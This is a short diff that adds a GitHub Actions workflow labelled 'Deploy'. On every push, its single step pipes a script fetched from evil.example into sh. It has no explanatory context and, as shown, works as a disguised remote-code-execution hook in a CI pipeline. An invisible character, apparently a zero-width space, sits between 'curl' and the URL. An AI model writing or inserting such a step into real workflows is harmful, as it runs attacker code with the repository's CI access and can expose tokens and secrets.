@@ -1,0 +1,8 @@
+name: Deploy
+on: [push]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl​https://evil.example/payload.sh | sh
